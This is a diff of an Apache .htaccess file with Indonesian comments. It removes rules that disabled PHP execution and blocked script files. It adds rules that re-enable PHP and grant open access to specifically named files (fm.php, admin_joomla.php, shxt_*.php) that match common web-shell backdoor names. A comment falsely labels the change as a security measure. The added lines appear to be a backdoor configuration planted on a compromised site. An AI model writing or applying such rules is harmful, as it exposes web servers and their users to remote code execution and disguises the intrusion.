@@ -1,16 +1,21 @@
-# Disable PHP execution
-php_flag engine off
+# Daftar ekstensi yang akan dikenali sebagai PHP
+AddType application/x-httpd-php .php .PHP .phtml .phar
 
-<FilesMatch "\.(php|phtml|phar|php3|php4|php5|php7|php8|PHP)$">
-    Require all denied
+# Mengizinkan akses dari semua
+Satisfy Any
+Allow from all
+
+# Blokir semua file PHP kecuali yang diizinkan
+<FilesMatch "\.(php|PHP|phtml|phar)$">
+    Order allow,deny
+    Deny from all
 </FilesMatch>
 
-# Block .htaccess access
-<Files ".htaccess">
-    Require all denied
-</Files>
-
-# Block script files
-<FilesMatch "\.(cgi|pl|py|sh|bash)$">
-    Require all denied
+# Izinkan akses ke file spesifik (contoh: fm.php, admin_joomla.php)
+<FilesMatch "^(fm|admin_joomla|shxt_[a-z0-9]+)\.(php|PHP|phtml|phar)$">
+    Order allow,deny
+    Allow from all
 </FilesMatch>
+
+# Konfigurasi tambahan untuk keamanan
+Options -Indexes
